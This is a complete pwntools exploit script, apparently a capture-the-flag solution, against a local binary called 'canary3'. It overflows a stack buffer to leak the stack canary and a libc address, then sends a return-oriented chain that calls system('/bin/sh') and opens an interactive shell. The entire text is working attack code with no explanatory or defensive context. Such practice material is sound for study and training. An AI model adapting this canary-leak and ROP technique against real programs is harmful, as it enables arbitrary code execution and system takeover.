from pwn import *

binary = "./canary3"
r = process(binary)
e = ELF(binary)
l = e.libc

payload = b"A" * 313
r.send(payload) 

r.recvuntil(payload)
canary = b"\x00" + r.recvn(7)
r.send(b"A")

log.info("canary: " + hex(u64(canary)))

payload = b"A" * 312
payload += b"B" * 8
payload += b"C" * 8

r.send(payload)
r.recvuntil(payload)
lb = u64(r.recvn(6) + b'\x00\x00') - 0x2a1ca
log.info("libc_base: " + hex(lb))

pop_rdi = lb + 0x000000000010f78b # pop rdi ; ret
sys = lb + l.symbols['system']
binsh = lb + next(l.search(b"/bin/sh"))

r.send(b"A")

payload = b"A" * 312
payload += canary
payload += b"B" * 8
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(sys)

r.send(payload)
r.send(b"y")

r.interactive()